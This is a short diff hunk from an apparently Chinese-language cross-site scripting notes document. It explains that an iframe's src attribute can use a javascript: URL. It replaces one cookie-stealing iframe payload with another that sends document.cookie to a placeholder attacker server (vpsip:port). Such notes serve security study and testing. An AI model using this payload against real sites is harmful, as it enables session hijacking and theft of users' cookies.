@@ -179,10 +179,10 @@ formaction action href xlink:href autofocus src content data
 
 `<iframe>`
 
-该标签的`src`属性相当于发起页面请求，因此可以直接跟远程服务器的ip,并且把cookie带过去
+该标签的`src`属性相当于发起页面请求，因此也可以调用`src`属性的`javascript`协议,并且把cookie带过去
 
 ```
-<iframe src='http://vpsip:port/?cookie'+document.cookie />
+<iframe src=javascript:window.location.href="http://vpsip:port/?"+document.cookie />
 ```
 
 还可以是用事件，因为返回404也是能正常加载到当前页面，所有不能触发onerror
